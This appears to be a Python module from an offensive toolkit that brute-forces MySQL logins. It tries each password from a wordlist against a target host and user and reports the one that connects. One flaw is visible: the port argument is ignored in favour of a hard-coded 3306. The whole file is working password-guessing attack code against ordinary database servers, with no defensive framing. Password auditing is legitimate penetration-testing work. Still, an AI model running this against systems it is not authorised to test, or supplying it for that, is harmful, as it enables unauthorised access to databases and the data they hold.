import os, MySQLdb
from wordlist import create_wordlist


def connect(host, user, password, port):
    """ Brute force MySQL. The function try password with the user and the host."""

    try:
        MySQLdb.connect(host=host, port=port, user=user, password=password, connect_timeout=3)
        output = f"Password found : '{password}'"
        return True, output
    except Exception as e:
        errno, message = e.args
        if errno == 1045:
            output = f"Test with login : {user} and password : {password} --> failed"
            return False, output
        else:
            output = "Unknown error"
            return False, output



def brute_force_mysql(target, user, port, wordlist):
    """ Brute force MySQL. The function loop on each password of the wordlist and try to connect to the MySQL server."""

    wordlists = create_wordlist(wordlist)
    for word in wordlists:
        status, message = connect(target, user, word, 3306)
        if status == True:
            return message
    return "Password is not in the wordlist"    